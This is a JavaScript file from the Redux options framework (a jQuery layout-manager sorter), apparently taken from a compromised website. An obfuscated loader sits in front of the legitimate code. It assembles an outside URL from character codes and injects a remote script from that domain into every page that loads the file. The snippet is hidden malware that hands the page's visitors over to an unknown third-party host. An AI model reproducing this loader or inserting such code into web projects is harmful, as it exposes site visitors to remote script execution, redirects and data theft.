var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}(function( $ ) {
    "use strict";
    $(
        function() {
            /**        Sorter (Layout Manager) */
            $( '.redux-sorter' ).each(
                function() {
                    var id = $( this ).attr( 'id' );

                    $( '#' + id ).find( 'ul' ).sortable(
                        {
                            items: 'li',
                            placeholder: "placeholder",
                            connectWith: '.sortlist_' + id,
                            opacity: 0.6,
                            update: function() {
                                $( this ).find( '.position' ).each(
                                    function() {
                                        var listID = $( this ).parent().attr( 'id' );
                                        var parentID = $( this ).parent().parent().attr( 'id' );

                                        parentID = parentID.replace( id + '_', '' );
                                        redux_change( $( this ) );

                                        var optionID = $( this ).parent().parent().parent().attr( 'id' );

                                        $( this ).prop(
                                            "name",
                                            redux.args.opt_name + '[' + optionID + '][' + parentID + '][' + listID + ']'
                                        );
                                    }
                                );
                            }
                        }
                    );
                }
            );
        }
    );
})( jQuery );